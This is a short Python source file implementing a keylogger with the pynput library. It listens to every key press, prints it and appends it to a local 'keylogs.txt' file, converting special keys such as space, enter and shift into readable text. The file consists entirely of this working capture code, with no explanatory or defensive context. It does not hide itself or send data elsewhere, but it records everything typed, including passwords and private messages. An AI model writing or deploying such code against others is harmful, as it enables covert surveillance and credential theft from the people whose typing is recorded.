from pynput import keyboard

class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            if self.get_char(key) == "Key.space":
                logs.write(" ")
            elif self.get_char(key) == "Key.ctrl":
                logs.write(" " + self.get_char(key) + " ")
            elif self.get_char(key) == "Key.ctrl_r":
                logs.write(" " + self.get_char(key) + " ")
            elif self.get_char(key) == "Key.shift":
                logs.write(" " + self.get_char(key) + " ")
            elif self.get_char(key) == "Key.shift_r":
                logs.write(" " + self.get_char(key) + " ")
            elif self.get_char(key) == "Key.caps_lock":
                logs.write(" " + self.get_char(key) + " ")
            elif self.get_char(key) == "Key.enter":
                logs.write("\n")
            elif self.get_char(key) == "Key.backspace":
                logs.write(" " + self.get_char(key) + " ")      
            else:
                logs.write(self.get_char(key))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()
        
def run():
    input()

if __name__ == '__main__':     
    logger = KeyLogger()
    logger.main()
    run()